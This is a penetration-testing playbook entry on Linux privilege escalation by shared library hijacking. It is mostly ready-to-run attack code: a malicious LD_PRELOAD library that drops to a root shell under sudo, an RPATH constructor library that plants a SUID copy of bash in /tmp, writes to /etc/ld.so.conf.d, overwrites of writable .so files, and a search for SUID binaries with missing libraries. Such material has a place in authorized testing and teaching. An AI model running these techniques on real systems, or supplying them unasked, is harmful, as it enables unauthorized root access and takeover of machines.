---
id: linux-shared-lib
title: Shared Library Hijacking
stage: privesc
tags: [linux]
tools:
  - readelf -d /path/to/binary | grep rpath
  - ldd /path/to/binary
  - find / -writable -name "*.so*" 2>/dev/null
leads_to: [root-linux]
summary: Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths to execute code as a privileged user.
---

## LD_PRELOAD via sudo env_keep

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```bash
sudo -l
# Matching Defaults entries for user:
#   env_keep+=LD_PRELOAD

# Create malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Run any sudo command with evil library
sudo LD_PRELOAD=/tmp/evil.so /any/allowed/command
```

## Writable RPATH

```bash
# Check binary's RPATH — a writable directory here = win
readelf -d /usr/local/bin/suid_binary | grep -i rpath
# RPATH: /tmp/lib

# Identify what library is loaded
ldd /usr/local/bin/suid_binary
# libcustom.so.1 => not found

# Create malicious library at the RPATH location
cat > /tmp/lib/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
EOF
gcc -shared -fPIC -o /tmp/lib/libcustom.so.1 /tmp/lib/libcustom.c

# Run the binary — it loads your library as root
/usr/local/bin/suid_binary
/tmp/bash -p
```

## Writable /etc/ld.so.conf.d/

```bash
# If you can write to ldconfig paths
ls -la /etc/ld.so.conf.d/
find /etc/ld.so.conf.d/ -writable 2>/dev/null

# Add your path
echo "/tmp/lib" > /etc/ld.so.conf.d/evil.conf
ldconfig

# Now drop malicious library and trigger any program that uses the hijacked lib
```

## Shared Library in Writable Path

```bash
# Find shared libraries in writable locations
find / -writable -name "*.so*" 2>/dev/null 2>&1 | grep -v proc

# Find what binary loads a writable .so
ldd /usr/bin/something | grep "/writable/path/lib.so"

# Overwrite it
cp /tmp/evil.so /writable/path/lib.so
```

## Check SUID Binaries for Library Loading

```bash
# Find SUID binaries, then check their library deps
find / -perm -4000 2>/dev/null -exec ldd {} \; 2>/dev/null | grep "not found"
# "not found" = library missing = place yours in search path
```

## Notes

- `LD_PRELOAD` is ignored for SUID binaries — it only works when the escalation is via sudo
- RPATH hijacking works even when LD_PRELOAD is blocked because RPATH is embedded in the binary
- Always run `ldd` to see what libraries a target binary loads before writing the hijack
- If no RPATH but you can write to a directory already in `/etc/ld.so.conf`, same result

